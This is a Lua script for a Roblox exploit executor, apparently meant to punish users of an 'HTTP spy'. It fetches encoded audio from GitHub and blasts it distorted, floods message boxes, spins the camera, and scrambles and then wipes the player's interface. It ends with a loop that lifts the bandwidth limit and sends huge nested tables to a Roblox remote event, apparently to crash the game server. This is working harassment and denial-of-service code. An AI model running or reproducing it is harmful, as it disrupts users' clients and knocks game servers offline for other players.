local MessageBoxFlags = {
    0,
    1,
    2,
    3,
    4,
    5,
    16,
    32,
    48,
    64,
    256,
    4096,
    16384
}

local sounds = {
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043237.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043244.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043330.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043455.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043549.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043602.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043609.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043616.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043700.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043730.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070459.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070507.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070514.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070532.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070537.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070553.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070627.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070636.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213041658.txt",
}

local audios = {}

for i,v in sounds do
	task.spawn(function()
		local Sound = Instance.new("Sound",game)
		Sound.Volume = 10
		local dist = Instance.new("DistortionSoundEffect",Sound)
		dist.Level = 0.75
		dist.Enabled = true
		local Encoded = game:HttpGet(v)
		writefile(i..".mp3", crypt.base64decode(Encoded))
		local Retrieved = getcustomasset(i..".mp3")
		Sound.SoundId = Retrieved
		table.insert(audios,Sound)	
	end)
end

local cc = Instance.new("ColorCorrectionEffect",game:GetService("Lighting"))
cc.Contrast = 1
cc.Saturation = 3
cc.TintColor = Color3.new(1,0,0)

task.spawn(function()
    while task.wait() do
        task.spawn(function()
            messagebox("HTTP SPY DETECTED", "HTTP SPY DETECTED", 4096)
        end)
		pcall(function()
			workspace.CurrentCamera.CFrame *= CFrame.Angles(math.random(0,360),math.random(0,360),math.random(0,360))
		end)
    end
end)

pcall(function()
	task.spawn(function()
		while task.wait() do
			for i,v in game:GetService("CoreGui"):GetDescendants() do
				task.spawn(function()
					pcall(function()
						v.Name = "HTTP SPY DETECTED"
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Text = "HTTP SPY DETECTED"
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Rotation = math.random(0,360)
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Visible = true
					end)
				end)
				task.wait()
			end
		end
	end)

	local hui = gethui()

	if hui then
		task.spawn(function()
			while task.wait() do
				for i,v in hui:GetDescendants() do
					task.spawn(function()
						pcall(function()
							v.Name = "HTTP SPY DETECTED"
						end)
					end)
					task.spawn(function()
						pcall(function()
							v.Text = "HTTP SPY DETECTED"
						end)
					end)
					task.spawn(function()
						pcall(function()
							v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
						end)
					end)
					task.spawn(function()
						pcall(function()
							v.Rotation = math.random(0,360)
						end)
					end)
					task.spawn(function()
						pcall(function()
							v.Visible = true
						end)
					end)
					task.wait()
				end
			end
		end)
	end

	task.spawn(function()
		while task.wait() do
			for i,v in game:GetService("Players").LocalPlayer.PlayerGui:GetDescendants() do
				task.spawn(function()
					pcall(function()
						v.Name = "HTTP SPY DETECTED"
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Text = "HTTP SPY DETECTED"
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Rotation = math.random(0,360)
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Visible = true
					end)
				end)
				task.wait()
			end
		end
	end)
end)

task.spawn(function()
	local count = 1
    while task.wait() do
		local s,e
		repeat s,e = pcall(function()
			Sound = audios[count]
        	Sound:Play()
		end)
		task.wait()
		until s
        Sound.Ended:Wait()
		count += 1
		if count > #sounds then
			count = 1
		end
    end
end)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local Sound = Instance.new("Sound", game.Workspace)
Sound.SoundId = "rbxassetid://9041745502"
Sound.Volume = 10
Sound.Looped = true
Sound:Play()

local countdown = 1
while countdown > 0 do
    if countdown == 10 or countdown == 5 then
        sendChatMessage("End of session via: " .. countdown .. "s")
    end
    countdown = countdown - 1
    wait(1)
end
wait(1)
game.Players.LocalPlayer.PlayerGui:ClearAllChildren()
game.CoreGui:ClearAllChildren()

while wait(0.01) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end
local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}
table.insert(spammedtable, {})
z = spammedtable[1]
for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end
local calculatemax = getmaxvalue(tableincrease)
local maximum
if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end
for i = 1, maximum do
     table.insert(maintable, spammedtable)
end
for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end
bomb(250, 2) --// change values if client crashes
end